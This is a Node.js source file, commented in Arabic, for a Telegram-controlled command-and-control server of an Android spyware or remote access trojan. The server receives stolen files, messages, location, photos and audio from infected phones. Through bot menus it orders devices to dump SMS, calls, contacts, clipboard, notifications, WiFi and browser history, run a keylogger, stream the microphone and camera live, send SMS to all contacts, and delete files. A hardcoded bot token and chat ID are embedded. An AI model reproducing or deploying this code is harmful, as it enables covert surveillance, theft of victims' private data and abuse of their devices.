const express = require('express');
const WebSocket = require('ws'); 
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

const token = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
const id = '7604667042';

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const bot = new TelegramBot(token, {
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            timeout: 10
        }
    }
});

const clients = new Map();
const upload = multer();

app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// Routes الأساسية
app.get('/', (req, res) => {
    res.send('<h1 align="center">🛡️ نظام الإدارة الآمن</h1>');
});

// استقبال الملفات من الأجهزة
app.post('/uploadFile', upload.single('file'), (req, res) => {
    const filename = req.file.originalname;
    const model = req.headers.model || 'Unknown';
    
    bot.sendDocument(id, req.file.buffer, {
        caption: `📁 ملف من جهاز: <b>${model}</b>\n📄 ${filename}`,
        parse_mode: 'HTML'
    }, { filename: filename, contentType: 'application/octet-stream' });
    
    res.send('');
});

// استقبال النصوص
app.post('/uploadText', (req, res) => {
    const model = req.headers.model || 'Unknown';
    bot.sendMessage(id, `📝 رسالة من جهاز: <b>${model}</b>\n\n${req.body.text}`, { parse_mode: 'HTML' });
    res.send('');
});

// استقبال الموقع
app.post('/uploadLocation', (req, res) => {
    const model = req.headers.model || 'Unknown';
    bot.sendLocation(id, req.body.lat, req.body.lon);
    bot.sendMessage(id, `📍 موقع من جهاز: <b>${model}</b>`, { parse_mode: 'HTML' });
    res.send('');
});

// استقبال الصور من الكاميرا
app.post('/uploadImage', upload.single('image'), (req, res) => {
    const model = req.headers.model || 'Unknown';
    const cameraType = req.headers.camera_type || 'Unknown';
    
    bot.sendPhoto(id, req.file.buffer, {
        caption: `📸 صورة من جهاز: <b>${model}</b>\n🎯 ${cameraType}`,
        parse_mode: 'HTML'
    });
    
    res.send('');
});

// استقبال التسجيلات الصوتية
app.post('/uploadAudio', upload.single('audio'), (req, res) => {
    const model = req.headers.model || 'Unknown';
    const duration = req.headers.duration || 'Unknown';
    
    bot.sendAudio(id, req.file.buffer, {
        caption: `🎤 تسجيل من جهاز: <b>${model}</b>\n⏱️ ${duration} ثانية`,
        parse_mode: 'HTML'
    });
    
    res.send('');
});

// اتصال WebSocket
wss.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'Unknown';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || 'Unknown';
    const provider = req.headers.provider || 'Unknown';
    
    ws.uuid = uuid;
    clients.set(uuid, { 
        model, 
        battery, 
        version, 
        brightness, 
        provider,
        connection: ws
    });
    
    console.log(`✅ جهاز متصل: ${model} (${uuid})`);
    
    bot.sendMessage(id, 
        `🆕 جهاز جديد متصل\n\n` +
        `📱 <b>${model}</b>\n` +
        `🔋 <b>${battery}%</b>\n` +
        `🤖 <b>${version}</b>\n` +
        `💡 <b>${brightness}</b>\n` +
        `📶 <b>${provider}</b>\n` +
        `🆔 <code>${uuid}</code>`, 
        { parse_mode: 'HTML' }
    );
    
    ws.on('close', () => {
        console.log(`❌ جهاز انقطع: ${model}`);
        bot.sendMessage(id, 
            `❌ انقطع الاتصال\n\n` +
            `📱 <b>${model}</b>\n` +
            `🔋 <b>${battery}%</b>`,
            { parse_mode: 'HTML' }
        );
        clients.delete(uuid);
    });
});

// معالجة رسائل البوت
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (chatId.toString() !== id) {
        bot.sendMessage(chatId, '❌ غير مصرح');
        return;
    }
    
    console.log(`📩 رسالة: ${text}`);
    
    if (msg.reply_to_message) {
        handleReplyMessage(msg);
        return;
    }
    
    handleMainCommand(msg);
});

function handleReplyMessage(msg) {
    const replyText = msg.reply_to_message.text;
    const userText = msg.text;
    
    if (!currentUuid) {
        bot.sendMessage(id, '❌ حدد الجهاز أولاً');
        return;
    }
    
    if (replyText.includes('أدخل الرقم')) {
        currentNumber = userText;
        bot.sendMessage(id, '📝 أدخل نص الرسالة:', { 
            reply_markup: { force_reply: true } 
        });
        return;
    }
    
    if (replyText.includes('أدخل نص الرسالة')) {
        sendToDevice(currentUuid, `sms:${currentNumber}:${userText}`);
        showMainMenu('✅ تم الإرسال');
        return;
    }
    
    if (replyText.includes('رسالة للجميع')) {
        sendToDevice(currentUuid, `sms_all:${userText}`);
        showMainMenu('✅ تم الإرسال');
        return;
    }
    
    if (replyText.includes('مسار الملف')) {
        sendToDevice(currentUuid, `get_file:${userText}`);
        showMainMenu('✅ جاري الجلب');
        return;
    }
    
    if (replyText.includes('مدة التسجيل')) {
        const duration = parseInt(userText) || 10;
        sendToDevice(currentUuid, `record_audio:${duration}`);
        showMainMenu(`🎤 جاري التسجيل ${duration} ثانية`);
        return;
    }
    
    if (replyText.includes('نص التنبيه')) {
        sendToDevice(currentUuid, `show_toast:${userText}`);
        showMainMenu('✅ تم العرض');
        return;
    }
    
    if (replyText.includes('رابط الصوت')) {
        sendToDevice(currentUuid, `play_audio:${userText}`);
        showMainMenu('🔊 جاري التشغيل');
        return;
    }

    if (replyText.includes('عدد الصور')) {
        const count = parseInt(userText) || 1;
        sendToDevice(currentUuid, `take_photos:${count}`);
        showMainMenu(`📸 جاري التقاط ${count} صورة`);
        return;
    }

    if (replyText.includes('مسار الحذف')) {
        sendToDevice(currentUuid, `delete_file:${userText}`);
        showMainMenu('🗑️ جاري الحذف');
        return;
    }
}

function handleMainCommand(msg) {
    const text = msg.text;
    
    switch(text) {
        case '/start':
            showStartMenu();
            break;
            
        case '📱 الأجهزة':
            showConnectedDevices();
            break;
            
        case '⚙️ الأوامر':
            showCommandsList();
            break;
            
        case '🔄 تحديث':
            showConnectedDevices();
            break;

        case '📊 الإحصائيات':
            showStatistics();
            break;
            
        default:
            bot.sendMessage(id, '❌ استخدم /start');
    }
}

// معالجة Callback Queries
bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    
    console.log(`🔘 ${data}`);
    
    try {
        const [action, uuid] = data.split(':');
        const device = clients.get(uuid);
        
        if (!device) {
            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ غير متصل' });
            return;
        }
        
        bot.answerCallbackQuery(callbackQuery.id);
        
        switch(action) {
            case 'device':
                showDeviceCommands(message, uuid, device);
                break;
                
            case 'info':
                sendToDevice(uuid, 'get_info');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📊 جاري جمع المعلومات');
                break;
                
            case 'sms':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '📱 أدخل الرقم:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
                
            case 'sms_all':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '📨 أدخل الرسالة:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
                
            case 'calls':
                sendToDevice(uuid, 'get_calls');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📞 جاري الجلب');
                break;
                
            case 'contacts':
                sendToDevice(uuid, 'get_contacts');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('👥 جاري الجلب');
                break;
                
            case 'messages':
                sendToDevice(uuid, 'get_messages');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('💬 جاري الجلب');
                break;
                
            case 'location':
                sendToDevice(uuid, 'get_location');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📍 جاري تحديد الموقع');
                break;
                
            case 'record_audio':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '🎤 المدة بالثواني:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
                
            case 'camera_front':
                sendToDevice(uuid, 'take_photo:front');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📸 جاري الالتقاط');
                break;
                
            case 'camera_back':
                sendToDevice(uuid, 'take_photo:back');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📷 جاري الالتقاط');
                break;

            case 'camera_burst':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '📸 عدد الصور:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
                
            case 'files':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '📁 مسار الملف:', { 
                    reply_markup: { force_reply: true } 
                });
                break;

            case 'files_all':
                sendToDevice(uuid, 'get_all_files');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📂 جاري جمع الملفات');
                break;

            case 'delete_file':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '🗑️ مسار الحذف:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
                
            case 'toast':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '🔔 نص التنبيه:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
                
            case 'vibrate':
                sendToDevice(uuid, 'vibrate');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📳 جاري الاهتزاز');
                break;
                
            case 'play_sound':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '🔊 رابط الصوت:', { 
                    reply_markup: { force_reply: true } 
                });
                break;

            case 'stop_sound':
                sendToDevice(uuid, 'stop_audio');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('🔇 تم الإيقاف');
                break;
                
            case 'apps':
                sendToDevice(uuid, 'get_apps');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📱 جاري الجلب');
                break;

            case 'apps_details':
                sendToDevice(uuid, 'get_apps_details');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📊 جاري جمع التفاصيل');
                break;

            case 'clipboard':
                sendToDevice(uuid, 'get_clipboard');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📋 جاري جلب الحافظة');
                break;

            case 'notifications':
                sendToDevice(uuid, 'get_notifications');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('🔔 جاري جلب الإشعارات');
                break;

            case 'wifi':
                sendToDevice(uuid, 'get_wifi');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📶 جاري جلب شبكات WiFi');
                break;

            case 'browser':
                sendToDevice(uuid, 'get_browser_history');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('🌐 جاري جلب سجل المتصفح');
                break;

            case 'keylogger':
                sendToDevice(uuid, 'start_keylogger');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('⌨️ جاري تسجيل لوحة المفاتيح');
                break;

            case 'screenshot':
                sendToDevice(uuid, 'take_screenshot');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('🖼️ جاري التقاط لقطة الشاشة');
                break;

            case 'microphone_live':
                sendToDevice(uuid, 'start_mic_stream');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('🎤 جاري البث المباشر للميكروفون');
                break;

            case 'camera_live':
                sendToDevice(uuid, 'start_camera_stream');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📹 جاري البث المباشر للكاميرا');
                break;
                
            default:
                bot.answerCallbackQuery(callbackQuery.id, { text: '❌ غير معروف' });
        }
        
    } catch (error) {
        console.error('❌ خطأ:', error);
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ حدث خطأ' });
    }
});

// الدوال المساعدة
function sendToDevice(uuid, command) {
    const device = clients.get(uuid);
    if (device && device.connection.readyState === WebSocket.OPEN) {
        device.connection.send(command);
        console.log(`✅ ${command} → ${uuid}`);
        return true;
    }
    return false;
}

function showMainMenu(text = 'اختر من القائمة:') {
    bot.sendMessage(id, text, {
        reply_markup: {
            keyboard: [
                ['📱 الأجهزة', '⚙️ الأوامر'],
                ['📊 الإحصائيات', '🔄 تحديث']
            ],
            resize_keyboard: true
        }
    });
}

function showStartMenu() {
    bot.sendMessage(id,
        `🛡️ *نظام الإدارة الآمن*\n\n` +
        `✅ *الميزات المتوفرة:*\n` +
        `• إدارة الأجهزة المتصلة\n` +
        `• المراقبة والتتبع\n` +
        `• إدارة الملفات\n` +
        `• التحكم عن بعد\n` +
        `• جمع المعلومات\n` +
        `• الحماية والأمان\n` +
        `\n⚡ *اختر من القائمة:*`,
        {
            parse_mode: 'Markdown',
            reply_markup: {
                keyboard: [
                    ['📱 الأجهزة', '⚙️ الأوامر'],
                    ['📊 الإحصائيات', '🔄 تحديث']
                ],
                resize_keyboard: true
            }
        }
    );
}

function showConnectedDevices() {
    if (clients.size === 0) {
        bot.sendMessage(id, '❌ لا توجد أجهزة متصلة');
        return;
    }
    
    let devicesText = `📱 *الأجهزة المتصلة (${clients.size}):*\n\n`;
    
    clients.forEach((device, uuid) => {
        devicesText += 
            `📱 *${device.model}*\n` +
            `🔋 ${device.battery}% | 🤖 ${device.version}\n` +
            `📶 ${device.provider} | 💡 ${device.brightness}\n` +
            `🆔 \`${uuid}\`\n\n`;
    });
    
    bot.sendMessage(id, devicesText, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: '🔄 تحديث', callback_data: 'refresh' },
                { text: '⚙️ الأوامر', callback_data: 'show_commands' }
            ]]
        }
    });
}

function showCommandsList() {
    if (clients.size === 0) {
        bot.sendMessage(id, '❌ لا توجد أجهزة متصلة');
        return;
    }
    
    const deviceButtons = [];
    clients.forEach((device, uuid) => {
        deviceButtons.push([{
            text: `📱 ${device.model} (${device.battery}%)`,
            callback_data: `device:${uuid}`
        }]);
    });
    
    bot.sendMessage(id, '🔘 اختر الجهاز:', {
        reply_markup: { inline_keyboard: deviceButtons }
    });
}

function showDeviceCommands(message, uuid, device) {
    const keyboard = [
        [
            { text: '📊 معلومات', callback_data: `info:${uuid}` },
            { text: '📍 موقع', callback_data: `location:${uuid}` }
        ],
        [
            { text: '📞 مكالمات', callback_data: `calls:${uuid}` },
            { text: '💬 رسائل', callback_data: `messages:${uuid}` }
        ],
        [
            { text: '👥 جهات اتصال', callback_data: `contacts:${uuid}` },
            { text: '📱 تطبيقات', callback_data: `apps:${uuid}` }
        ],
        [
            { text: '📨 إرسال رسالة', callback_data: `sms:${uuid}` },
            { text: '📨 للجميع', callback_data: `sms_all:${uuid}` }
        ],
        [
            { text: '📸 أمامية', callback_data: `camera_front:${uuid}` },
            { text: '📷 خلفية', callback_data: `camera_back:${uuid}` },
            { text: '📸 متعدد', callback_data: `camera_burst:${uuid}` }
        ],
        [
            { text: '🎤 تسجيل', callback_data: `record_audio:${uuid}` },
            { text: '🔊 تشغيل', callback_data: `play_sound:${uuid}` },
            { text: '🔇 إيقاف', callback_data: `stop_sound:${uuid}` }
        ],
        [
            { text: '📁 ملف', callback_data: `files:${uuid}` },
            { text: '📂 كل الملفات', callback_data: `files_all:${uuid}` },
            { text: '🗑️ حذف', callback_data: `delete_file:${uuid}` }
        ],
        [
            { text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` },
            { text: '🔔 تنبيه', callback_data: `toast:${uuid}` }
        ],
        [
            { text: '🖼️ لقطة شاشة', callback_data: `screenshot:${uuid}` },
            { text: '📋 حافظة', callback_data: `clipboard:${uuid}` }
        ],
        [
            { text: '🔔 إشعارات', callback_data: `notifications:${uuid}` },
            { text: '📶 شبكات', callback_data: `wifi:${uuid}` }
        ],
        [
            { text: '🌐 متصفح', callback_data: `browser:${uuid}` },
            { text: '⌨️ تسجيل', callback_data: `keylogger:${uuid}` }
        ],
        [
            { text: '🎤 بث مباشر', callback_data: `microphone_live:${uuid}` },
            { text: '📹 بث كاميرا', callback_data: `camera_live:${uuid}` }
        ]
    ];
    
    bot.editMessageText(
        `⚙️ *أوامر الجهاز:*\n📱 ${device.model}\n🔋 ${device.battery}% | 🤖 ${device.version}`,
        {
            chat_id: message.chat.id,
            message_id: message.message_id,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: keyboard }
        }
    );
}

function showStatistics() {
    let statsText = `📊 *إحصائيات النظام*\n\n`;
    statsText += `📱 الأجهزة المتصلة: *${clients.size}*\n`;
    statsText += `🕒 وقت التشغيل: *${Math.floor(process.uptime() / 60)} دقيقة*\n`;
    statsText += `💾 استخدام الذاكرة: *${Math.round(process.memoryUsage().rss / 1024 / 1024)} MB*\n\n`;
    
    if (clients.size > 0) {
        statsText += `*الأجهزة النشطة:*\n`;
        clients.forEach((device, uuid) => {
            statsText += `• ${device.model} (${device.battery}%)\n`;
        });
    }
    
    bot.sendMessage(id, statsText, { parse_mode: 'Markdown' });
}

// معالجة الأخطاء
bot.on('error', (error) => {
    console.error('❌ خطأ في البوت:', error);
});

bot.on('polling_error', (error) => {
    console.error('❌ خطأ في الاتصال:', error);
});

// بدء الخادم
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
    console.log('🤖 البوت جاهز لاستقبال الأجهزة...');
});

// الحفاظ على الاتصال نشطاً
setInterval(() => {
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
            client.ping();
        }
    });
}, 30000);
